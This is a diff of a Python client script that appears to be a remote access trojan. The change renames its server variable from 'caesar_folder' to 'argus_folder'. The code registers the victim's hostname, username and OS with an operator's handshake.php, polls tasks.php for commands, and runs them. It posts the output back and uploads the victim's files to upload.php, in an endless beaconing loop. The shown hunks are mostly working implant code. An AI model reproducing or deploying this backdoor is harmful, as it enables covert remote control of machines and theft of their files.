@@ -14,7 +14,7 @@ from time import sleep
 from requests.utils import quote
 
 # Replace with your URL/IP
-caesar_folder = 'REPLACE_ME'
+argus_folder = 'REPLACE_ME'
 
 def md5 (string):
 	m = hashlib.md5()
@@ -48,7 +48,7 @@ delay = 10
 while 1:
 
 	try:
-		r = requests.post (caesar_folder + '/target/handshake.php', data={'hostname': quote(hostname), 'username': quote(username), 'os': quote(operating_system), 'arch': arch, 'unique_id': unique_id, 'wd': quote(working_directory)})
+		r = requests.post (argus_folder + '/target/handshake.php', data={'hostname': quote(hostname), 'username': quote(username), 'os': quote(operating_system), 'arch': arch, 'unique_id': unique_id, 'wd': quote(working_directory)})
 		if r.text == 'OK':
 			break
 	except:
@@ -75,7 +75,7 @@ while 1:
 				task_id = process[1]['task_id']
 				working_directory = process[1]['wd']
 
-				r = requests.post (caesar_folder + '/target/output.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id, 'output': output, 'wd': quote(working_directory)})
+				r = requests.post (argus_folder + '/target/output.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id, 'output': output, 'wd': quote(working_directory)})
 
 			else:
 				non_terminated.append (process)
@@ -84,7 +84,7 @@ while 1:
 		non_terminated = []
 
 	# Check if there are new commands to execute
-	r = requests.post (caesar_folder + '/target/tasks.php', data={'unique_id': unique_id})
+	r = requests.post (argus_folder + '/target/tasks.php', data={'unique_id': unique_id})
 	response = r.text
 
 	# If the response from the server is not empty
@@ -123,7 +123,7 @@ while 1:
 					files = {'file_to_upload': open(filename,'rb')}
 
 					# Start the download without blocking the process
-					r = grequests.post(caesar_folder + '/target/upload.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id}, files=files)
+					r = grequests.post(argus_folder + '/target/upload.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id}, files=files)
 					job = grequests.send(r, grequests.Pool(1))
 
 					output = 'The file is being uploaded to the server'
@@ -161,7 +161,7 @@ while 1:
 					output = 'executing'
 
 			# Send the output to the server
-			r = requests.post (caesar_folder + '/target/output.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id, 'output': output, 'wd': quote(working_directory)})
+			r = requests.post (argus_folder + '/target/output.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id, 'output': output, 'wd': quote(working_directory)})
 
 		sleep (delay)
 
